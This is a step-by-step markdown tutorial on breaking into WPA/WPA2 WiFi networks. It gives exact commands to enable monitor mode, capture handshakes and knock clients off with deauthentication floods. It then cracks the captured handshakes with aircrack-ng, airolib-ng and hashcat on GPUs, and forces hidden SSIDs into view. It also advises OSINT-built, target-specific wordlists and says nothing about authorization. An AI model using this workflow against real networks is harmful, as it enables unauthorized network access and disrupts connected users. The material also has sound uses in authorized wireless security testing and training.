# 📘 Overview

Capturing normal WiFi traffic is usually **not useful** for WPA/WPA2 cracking because it does not reveal key information.

---

# 🎯 Important Concept

The most important data is:

```
4-Way Handshake
```

The handshake occurs when:

- A client connects
- A client reconnects
- Reauthentication happens

This handshake is used for:

- Password verification
- Offline password cracking

---

# ⚙ Requirements

## 📡 Wireless Adapter

Must support:

- Monitor mode
- Packet injection

---

## 🛠 Required Tools

- Aircrack-ng suite
- Wordlist
- Wireshark (optional analysis)

---

# 🤝 Capturing the Handshake

# 1️⃣ Step 1 — Enable Monitor Mode

```bash
airmon-ng start wlan0
```

Creates:

```
wlan0mon
```

---

# 2️⃣ Step 2 — Scan Networks

```bash
airodump-ng wlan0mon
```

---

# 🔍 Identify Target Information

Collect:

- BSSID
- Channel
- ESSID

---

# 3️⃣ Step 3 — Capture Target Network

```bash
airodump-ng --channel [channel] --bssid [bssid] --write [file-name] wlan0mon
```

---

# 🧪 Example

```bash
airodump-ng --channel 1 --bssid 50:D4:F7:47:82:46 --write AI-Test wlan0mon
```

---

# ⚠ Important

Keep this capture window running continuously.

This window captures:

- Handshakes
- Clients
- Reconnection traffic

---

# 4️⃣ Step 4 — Force Handshake (Deauthentication Attack)

```bash
aireplay-ng --deauth [count] -a [AP_MAC] -c [CLIENT_MAC] wlan0mon
```

---

# 🧪 Example

```bash
aireplay-ng --deauth 0 -a 50:D4:F7:47:82:46 wlan0mon
```

---

# 🔄 Alternative Short Form

```bash
aireplay-ng -0 0 -a 50:D4:F7:47:82:46 wlan0mon
```

---

# 📘 What Happens

This attack:

- Disconnects clients
- Forces reconnection
- Generates WPA/WPA2 handshake

---

# 🔓 Cracking the Handshake

# 🛠 Basic Syntax

```bash
aircrack-ng [file-name].cap -w [wordlist]
```

---

# 🧪 Example

```bash
aircrack-ng AI-Test-01.cap -w /usr/share/wordlists/rockyou.txt
```

---

# ⚠ Important Cracking Notes

## 🚫 Rockyou Limitation

Using:

```
rockyou.txt
```

is common, but:

- It is CPU intensive
- Can be slow
- May fail on strong passwords

---

# ✅ Better Approach

Rather than relying only on:

```
rockyou.txt
```

prefer:

- Custom wordlists
- Target-specific passwords
- Personalized dictionaries

because they increase cracking success rate.

---

# 🔍 Wireshark Analysis Method

Your capture file:

```
.cap
```

can also be opened in:

```
Wireshark
```

You can manually inspect:

- Handshake packets
- EAPOL frames
- Authentication process
- MAC addresses

Then extract hashes for advanced cracking tools.

---

# 📘 Important Note

Aircrack-ng is still a very good beginner-friendly option because:

- Simple workflow
- Easy syntax
- Integrated suite
- Fast testing environment

---

# 🔄 Full Workflow

# 1️⃣ Enable Monitor Mode

```bash
airmon-ng start wlan0
```

---

# 2️⃣ Scan Networks

```bash
airodump-ng wlan0mon
```

---

# 3️⃣ Lock Onto Target

```bash
airodump-ng --channel 1 --bssid <BSSID> --write capture wlan0mon
```

---

# 4️⃣ Force Reconnection

```bash
aireplay-ng -0 0 -a <BSSID> wlan0mon
```

---

# 5️⃣ Capture Handshake

Watch top-right corner in airodump-ng:

```
WPA Handshake: <BSSID>
```

---

# 6️⃣ Crack Password

```bash
aircrack-ng capture.cap -w custom_wordlist.txt
```

---

# 🛡 Practical Notes

- Strong passwords resist dictionary attacks
- WPA3 is harder to crack offline
- Handshake alone does not guarantee success
- Custom wordlists are more effective than generic lists
- Good signal strength improves handshake capture

---

# 📌 Summary Table

| Tool | Purpose |
| --- | --- |
| airmon-ng | Enable monitor mode |
| airodump-ng | Capture packets & handshake |
| aireplay-ng | Force reconnection |
| aircrack-ng | Crack captured handshake |
| Wireshark | Manual packet analysis |

# ⚡ Faster WPA/WPA2 Cracking Techniques

# 📘 Why Faster Cracking Is Needed

In WPA/WPA2 cracking:

```
PMK (Pairwise Master Key) computation is slow
```

because thousands or millions of password combinations may need to be tested.

To optimize cracking speed:

- Use precomputed PMKs
- Use GPU acceleration
- Use targeted/custom wordlists
- Analyze capture files manually

---

# 🌈 Faster Cracking Using Rainbow Tables (airolib-ng)

# 📘 Concept

Instead of calculating PMKs repeatedly:

```
Precompute and store them in a database
```

This speeds up repeated cracking attempts against the same ESSID.

---

# 🛠 Step 1 — Create Database & Import Wordlist

```bash
airolib-ng db-AI-Test --import passwd /usr/share/wordlists/rockyou.txt
```

---

# 🛠 Step 2 — Import ESSID

## Create ESSID File

```bash
echo "AI-Test" > essid-AI-Test
```

---

## Import ESSID

```bash
airolib-ng db-AI-Test --import essid essid-AI-Test
```

---

# 🛠 Step 3 — Compute PMKs

```bash
airolib-ng db-AI-Test --batch
```

---

# 🛠 Step 4 — Use Precomputed Data

```bash
aircrack-ng -r db-AI-Test AI-Test-01.cap
```

---

# ⚠ Important Notes About Rainbow Tables

- Useful for repeated testing
- Faster after PMK generation
- Database creation takes time initially
- Works best with common ESSIDs

---

# 🚀 Faster Cracking Using GPU (Hashcat)

# 📘 Why Hashcat?

Hashcat uses:

```
GPU acceleration
```

which is significantly faster than CPU-only cracking.

---

# ⚙ Install hcxtools

```bash
git clone https://github.com/ZerBea/hcxtools.git
```

```bash
cd /opt/hcxtools
```

```bash
make -j $(nproc)
```

```bash
make install PREFIX=/usr/local
```

---

# 🔄 Convert Capture File

Hashcat requires:

```
.hc22000
```

format.

---

## Convert .cap File

```bash
hcxpcapngtool AI-Test-01.cap -o AI-Test.hc22000
```

---

# 🔓 Crack Using Hashcat

## Basic Syntax

```bash
hashcat -m 22000 output.hc22000 wordlist.txt
```

---

# 🧪 Example

```bash
hashcat -m 22000 -o cracked.txt output.hc22000 /opt/rockyou.txt
```

---

# 👀 Show Cracked Password

```bash
hashcat -m 22000 AI-Test.hc22000 /opt/password.txt --show
```

---

# ⚠ Important Cracking Notes

## 🚫 Avoid Depending Only on Rockyou

Using:

```
rockyou.txt
```

alone is not always effective because:

- CPU usage becomes high
- Cracking may be slow
- Strong passwords often fail

---

# ✅ Better Strategy

Prefer:

- Custom wordlists
- Company-specific words
- Personalized dictionaries
- OSINT-generated passwords

These dramatically improve success rate.

---

# 🔍 Manual Analysis with Wireshark

Open capture file:

```
.cap
```

inside:

```
Wireshark
```

Then manually inspect:

- EAPOL frames
- Handshakes
- Client MACs
- ESSIDs
- Authentication packets

You can later extract hashes for:

- Hashcat
- hcxtools
- Advanced offline cracking

---

# 📘 Aircrack-ng vs Hashcat

| Tool | Advantage |
| --- | --- |
| Aircrack-ng | Easy & beginner friendly |
| Hashcat | Extremely fast GPU cracking |
| Wireshark | Manual packet inspection |
| airolib-ng | PMK precomputation |

---

# 🛰 Finding Hidden Access Points (Hidden ESSID)

# 📘 Concept

Hidden WiFi networks suppress broadcasting of their ESSID.

However:

```
Clients reconnecting reveal the ESSID
```

---

# ⚙ Step 1 — Enable Monitor Mode

```bash
airmon-ng start wlan0
```

---

# ⚙ Step 2 — Scan Networks

```bash
airodump-ng wlan0mon
```

---

# ⚙ Step 3 — Target Hidden AP

```bash
airodump-ng --channel 1 --bssid 50:D4:F7:47:82:46 --write /tmp/ai3 wlan0mon
```

---

# ⚙ Step 4 — Force Client Reconnection

```bash
aireplay-ng --deauth 0 -a 50:D4:F7:47:82:46 wlan0mon
```

---

# 📘 Result

Deauthentication forces clients to reconnect.

During reconnection:

```
ESSID becomes visible in captured packets
```

---

# 🔄 Complete Fast-Cracking Workflow

# 1️⃣ Capture Handshake

```bash
airodump-ng --channel <CH> --bssid <BSSID> --write capture wlan0mon
```

---

# 2️⃣ Force Reconnection

```bash
aireplay-ng -0 0 -a <BSSID> wlan0mon
```

---

# 3️⃣ Convert Capture

```bash
hcxpcapngtool capture.cap -o capture.hc22000
```

---

# 4️⃣ GPU Crack

```bash
hashcat -m 22000 capture.hc22000 custom_wordlist.txt
```

---

# 🛡 Practical Notes

- GPU cracking is far faster than CPU cracking
- Custom wordlists outperform generic lists
- Hidden SSIDs are not truly hidden
- WPA3 is more resistant to offline attacks
- Signal quality affects handshake capture success
- Always lock onto correct channel before attacking

---

# 📌 Summary Table

| Tool | Purpose |
| --- | --- |
| airolib-ng | Precompute PMKs |
| aircrack-ng | Basic handshake cracking |
| hashcat | GPU password cracking |
| hcxtools | Convert capture formats |
| Wireshark | Manual packet analysis |
| airodump-ng | Packet capture |
| aireplay-ng | Force reconnection |
